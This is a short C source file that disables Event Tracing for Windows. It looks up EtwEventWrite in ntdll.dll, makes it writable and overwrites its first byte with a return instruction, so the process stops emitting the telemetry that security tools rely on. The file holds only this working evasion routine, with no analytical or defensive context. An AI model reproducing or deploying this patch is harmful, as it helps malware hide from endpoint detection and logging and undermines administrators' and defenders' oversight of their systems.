#include <windows.h>
#include "patch_etw.h"

int PatchEtw(void) {
    DWORD dwOld = 0;
    FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary("ntdll.dll"), "EtwEventWrite");
    if (!ptrNtTraceEvent) {
        return 1;
    }
    if (!VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld)) {
        return 1;
    }
    memcpy(ptrNtTraceEvent, "\xc3", 1);
    VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
    return 0;
}